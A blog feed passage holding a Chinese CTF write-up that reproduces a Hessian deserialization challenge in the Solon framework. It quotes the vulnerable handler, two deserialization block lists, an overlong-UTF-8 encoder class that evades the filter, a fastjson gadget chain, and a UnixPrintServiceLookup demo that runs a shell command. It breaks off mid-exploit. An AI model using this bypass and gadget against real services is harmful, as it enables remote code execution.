title="远程调试Docker"></a>远程调试Docker</h1><p>这里可以看看p神的视频：<a href="https://www.bilibili.com/video/BV1bb421n7M2/?vd_source=f056182291458f597ae69cee19ecf116">https://www.bilibili.com/video/BV1bb421n7M2/?vd_source=f056182291458f597ae69cee19ecf116</a></p><p>其实原理也一样，只要映射端口出来，然后本地放一个版本一样的jar包或者源码即可，就不再记录了。</p><h1 id="weblogic环境搭建"><a href="#Weblogic环境搭建" class="headerlink" title="Weblogic环境搭建"></a>Weblogic环境搭建</h1><p>因为准备看Weblogic，所以环境搭建也在这里写了吧</p><p>这里推荐这个环境搭建工具：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近想看看weblogic，但是环境比较难搭建和调试，趁着这个机会，看一下java的各种代码远程调试的方法，很基础的东西了，一直没看。(顺便水一篇博客)&lt;/p&gt;
&lt;h1 id=&quot;远程调试jar包&quot;&gt;&lt;a href=&quot;#远程调试Jar包&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="代码审计" scheme="https://clowsman.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>BookManager复现</title>
    <link href="https://clowsman.github.io/2025/01/10/BookManager%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2025/01/10/BookManager%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-01-10T14:42:36.000Z</published>
    <updated>2025-01-12T13:59:03.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当时ciscn&amp;长城杯场上的一题零解题，当时反编译看了一下这题的源码，发现是微服务形式的，有个ApiGateway，然后看了半天也找不到反序列化的点，甚至连请求哪个路由都不清楚🥲然后用的又是solon这个框架不熟悉，直接开摆了</p><p>后来看到有师傅解出来了，遂来复现一下</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>看了一下才发现网关这里限制了我们的路由前缀(没学过不太懂😭，怪不得直接getAllBooks什么都没有</p><p><img src="https://cdn.clown2024.cn/image-20250112172824168.png" alt="image-20250112172824168"></p><p>直接问deepseek的解释如下：</p><blockquote><p>这段代码实现了一个 API 网关，主要功能包括：</p><ol><li><strong>路由匹配</strong>：<ul><li>所有以 <code>/api/rest/</code> 开头的请求都会被该网关处理。</li><li>例如，<code>/api/rest/book</code> 会被映射到 <code>BookServiceImpl</code> 类。</li></ul></li><li><strong>前置逻辑</strong>：<ul><li>在请求处理之前，设置默认的响应渲染格式为 JSON。</li></ul></li><li><strong>服务注册</strong>：<ul><li>将 <code>BookServiceImpl</code> 类注册为处理 <code>/api/rest/book</code> 路径的服务。</li></ul></li></ol></blockquote><p><img src="https://cdn.clown2024.cn/image-20250110225521551.png" alt="image-20250110225521551"></p><p>这里可以看到用的是solon的2.5.12的版本，当时直接搜是没有搜到该版本的漏洞的，一搜反序列化基本都是2.5.11的</p><p><img src="https://cdn.clown2024.cn/image-20250110225852926.png" alt="image-20250110225852926"></p><p>然后这位老哥是从github的issue翻到相关的信息，嘶我突然想到我可以用英文搜一搜试试，被中文限制了，怪不得我每次都找不到exp😭</p><p><img src="https://cdn.clown2024.cn/image-20250110230600436.png" alt="image-20250110230600436"></p><p>果然换英文就能搜到很多东西了，可以直接去对应的issue看一看：<a href="https://github.com/opensolon/solon/issues/226%EF%BC%8C%E8%BF%99%E4%B8%AAissue%E6%98%AF%E7%94%A8Fury%E7%BB%84%E4%BB%B6%E7%9A%84RPC%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E">https://github.com/opensolon/solon/issues/226，这个issue是用Fury组件的RPC序列化和反序列化的漏洞</a></p><p><img src="https://cdn.clown2024.cn/image-20250110231433766.png" alt="image-20250110231433766"></p><p>但是题目给的这个版本为啥压根就没这东西。。。</p><p><img src="https://cdn.clown2024.cn/image-20250110231514440.png" alt="image-20250110231514440"></p><p>然后老哥是找的再往前的一个RCE的issue：<a href="https://github.com/opensolon/solon/issues/73">https://github.com/opensolon/solon/issues/73</a></p><p>该issue的漏洞是一个Hessian反序列化，在<strong>org&#x2F;noear&#x2F;solon&#x2F;serialization&#x2F;hessian&#x2F;HessianActionExecutor.java</strong>这个类里面的漏洞代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">changeBody</span><span class="hljs-params">(Context ctx)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ctx.bodyAsBytes()));<br>    <span class="hljs-keyword">return</span> hi.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250110232003916.png" alt="image-20250110232003916"></p><p>所以如果Content-Type 为 <code>application/hessian</code> ，则发送到含参 RESTful API 的 Request 中的 Body 部分会被 Hessian 进行反序列化，但是题目这里是手动加了一个tested方法来过滤</p><p>顺便看了一下原作者的修复，是将对hessian的依赖改成sofa-hessian，该版本用的也是sofa-hessian，有趣的是后面又有issue把sofa-hessian给绕了：<a href="https://github.com/opensolon/solon/issues/145">https://github.com/opensolon/solon/issues/145</a></p><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>看一下他的过滤方法，sofa-hessian本身就是利用了黑名单的方式，里面在hessian反序列化的过程进行了patch</p><p>在com.alibaba.com.caucho.hessian.io&#x2F;ClassFactory里面，emmm但是说实话这里挺奇怪的，我本地下了sofa-hessian他是并没有这个ClassFactory的，反而是在正常的hessian里面的，sofa-hessian的黑名单是另一种方式的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">static &#123;<br>        _staticAllowList = new ArrayList&lt;Allow&gt;();<br><br>        ClassLoader classLoader = ClassFactory.class.getClassLoader();<br>        List&lt;String&gt; stringList = new ArrayList&lt;&gt;();<br>        for (byte[] bytes : byteArray) &#123;<br>            stringList.add(new String(bytes));<br>        &#125;<br>        String[] denyClasses = stringList.toArray(new String[0]);<br>        for (String denyClass : denyClasses) &#123;<br>            if (denyClass.startsWith(&quot;#&quot;)) &#123;<br>                continue;<br>            &#125;<br>            if (denyClass.endsWith(&quot;.&quot;)) &#123;<br>                _staticAllowList.add(new AllowPrefix(denyClass, false));<br>            &#125; else &#123;<br>                _staticAllowList.add(new Allow(toPattern(denyClass), false));<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>黑名单如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.apache.bcel.util.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>pstore.shaded.org.apache.commons.collections.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>然后题目这里还有一个自己的黑名单</p><p><img src="https://cdn.clown2024.cn/image-20250110234707451.png" alt="image-20250110234707451"></p><p>testCases就用二维数组存放过滤的类，过滤的类如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.codec.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.dom4j.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.junit.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.mockito.<br>org.thymeleaf.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>ognl.<br>pstore.shaded.org.apache.commons.collections.<br>sun.print.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>这里因为直接检测序列化的字符串，那就可以直接利用UTF-8 Overlong Encoding方法绕过，虽然是Hessian但本质也是一样的，X1r0z✌的文章有说：<a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/</a></p><p>里面也有写好的代码，这里copy一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Hessian2Output</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Hessian2OutputWithOverlongEncoding</span><span class="hljs-params">(OutputStream os)</span> &#123;<br>        <span class="hljs-built_in">super</span>(os);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printString</span><span class="hljs-params">(String v, <span class="hljs-type">int</span> strOffset, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>        <span class="hljs-type">byte</span>[] buffer = (<span class="hljs-type">byte</span>[]) getSuperFieldValue(<span class="hljs-string">&quot;_buffer&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (SIZE &lt;= offset + <span class="hljs-number">16</span>) &#123;<br>                setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>                flushBuffer();<br>                offset = (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> v.charAt(i + strOffset);<br><br>            <span class="hljs-comment">// 2 bytes UTF-8</span><br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0xc0</span> + (convert(ch)[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x1f</span>));<br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0x80</span> + (convert(ch)[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0x3f</span>));<br><br><span class="hljs-comment">//            if (ch &lt; 0x80)</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (ch);</span><br><span class="hljs-comment">//            else if (ch &lt; 0x800) &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xc0 + ((ch &gt;&gt; 6) &amp; 0x1f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            else &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xe0 + ((ch &gt;&gt; 12) &amp; 0xf));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + ((ch &gt;&gt; 6) &amp; 0x3f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br>        &#125;<br><br>        setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printString</span><span class="hljs-params">(<span class="hljs-type">char</span>[] v, <span class="hljs-type">int</span> strOffset, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>        <span class="hljs-type">byte</span>[] buffer = (<span class="hljs-type">byte</span>[]) getSuperFieldValue(<span class="hljs-string">&quot;_buffer&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (SIZE &lt;= offset + <span class="hljs-number">16</span>) &#123;<br>                setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>                flushBuffer();<br>                offset = (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> v[i + strOffset];<br><br>            <span class="hljs-comment">// 2 bytes UTF-8</span><br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0xc0</span> + (convert(ch)[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x1f</span>));<br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0x80</span> + (convert(ch)[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0x3f</span>));<br><br><span class="hljs-comment">//            if (ch &lt; 0x80)</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (ch);</span><br><span class="hljs-comment">//            else if (ch &lt; 0x800) &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xc0 + ((ch &gt;&gt; 6) &amp; 0x1f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            else &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xe0 + ((ch &gt;&gt; 12) &amp; 0xf));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + ((ch &gt;&gt; 6) &amp; 0x3f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br>        &#125;<br><br>        setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] convert(<span class="hljs-type">int</span> i) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> ((i &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0b11111</span>) | <span class="hljs-number">0b11000000</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> (i &amp; <span class="hljs-number">0b111111</span>) | <span class="hljs-number">0b10000000</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123; b1, b2 &#125;;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getSuperFieldValue</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getSuperclass().getDeclaredField(name);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> f.get(<span class="hljs-built_in">this</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSuperFieldValue</span><span class="hljs-params">(String name, Object val)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getSuperclass().getDeclaredField(name);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            f.set(<span class="hljs-built_in">this</span>, val);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后这里还有一个fastjson1.2.83的版本，可以直接用fastjson原生反序列化的那条链子，不过因为有些类被ban了我们需要绕过，先看一下本来的链子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream.readObject -&gt; <br>HashMap.readObject -&gt; <br>BadAttributeValueExpException.readObject -&gt; <br>JSONArray.toString -&gt; <br>JSON.toString （JSONArray extends JSON）-&gt; <br>JSON.toJSONString -&gt; <br>TemplatesImpl.getOutputProperties -&gt; <br>TemplatesImpl.newTransformer<br></code></pre></td></tr></table></figure><p>但是这里BadAttributeValueExpException和TemplatesImpl都被过滤了，需要找其他类替换一下，BadAttributeValueExpException我们可以替换成<strong>XString</strong>，因为XString通过equals来触发toString，而HashMap反序列化的时候刚好会触发</p><p>然后TemplatesImpl部分的触发可以换成UnixPrintServiceLookup，不过这个类只在Unix下面才有用，而这部分的利用就在我前面说到的绕过sofa-hessian的issue里面</p><p><img src="https://cdn.clown2024.cn/image-20250112000746624.png" alt="image-20250112000746624"></p><p>这得用Linux下的idea调了。。。</p><h2 id="unixprintservicelookup类"><a href="#UnixPrintServiceLookup类" class="headerlink" title="UnixPrintServiceLookup类"></a>UnixPrintServiceLookup类</h2><p>这里来调一下他的利用方式，因为之前没见过，可以参考这篇文章：<a href="https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/">https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/</a></p><blockquote><p><code>UnixPrintServiceLookup</code> 是 Java 打印服务 API 中的一个平台特定实现类，主要用于在 <strong>Unix&#x2F;Linux</strong> 系统上查找和管理打印服务。它是 <code>PrintServiceLookup</code> 的一个子类，专门为 Unix 类操作系统（如 Linux、BSD 等）提供打印服务的查找和访问功能。</p></blockquote><p>该类利用的getter方法是sun.print.UnixPrintServiceLookup#getDefaultPrintService()，最终是触发到该类里面的一个execCmd方法</p><p><img src="https://cdn.clown2024.cn/image-20250112162426855.png" alt="image-20250112162426855"></p><p>该方法的调用有很多，我们需要找一个参数是我们能够控制的，这里找到了getDefaultPrinterNameBSD()方法</p><p><img src="https://cdn.clown2024.cn/image-20250112170753639.png" alt="image-20250112170753639"></p><p><img src="https://cdn.clown2024.cn/image-20250112170831539.png" alt="image-20250112170831539"></p><p>这里传入的参数都是属性值，那我们就可以通过反射来控制了</p><p>不过要走到这我们需要满足前面两个条件，isMac()和isSysV()判断的是你的系统是否为macOS和SunOS，可以用反射绕过，我用kali的就不用担心；</p><p>还有就是isCupsRunning()方法，isCupsRunning是检测本机的CUPS服务，可以通过访问<code>http://127.0.0.1:631/</code>看看是否开启，我用的kali是没有开启，看别人说Ubuntu默认开启，要注意一下，如果开启了用下面的命令关闭即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo systemctl mask cups<br>reboot<br></code></pre></td></tr></table></figure><p>然后调用的写法类似这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;touch /tmp/evilfile&quot;</span>;<br><span class="hljs-comment">//        Field theUnsafe = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="hljs-comment">//        theUnsafe.setAccessible(true);</span><br><span class="hljs-comment">//        Unsafe unsafe = (Unsafe) theUnsafe.get(null);</span><br><span class="hljs-comment">//        Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);</span><br>        <span class="hljs-type">UnixPrintServiceLookup</span> <span class="hljs-variable">unixPrintServiceLookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnixPrintServiceLookup</span>();<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);<br>        System.out.println(unixPrintServiceLookup.getDefaultPrintService());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250112171343508.png" alt="image-20250112171343508"></p><p>成功执行</p><blockquote><p>不过这里我看大部分都用Unsafe来获取UnixPrintServiceLookup的实例，可该类的构造方法是public的，我上面正常写也是能执行的，怪🤔</p></blockquote><h2 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h2><p>那现在就可以来改造我们的exp了(直接抄文章的exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span 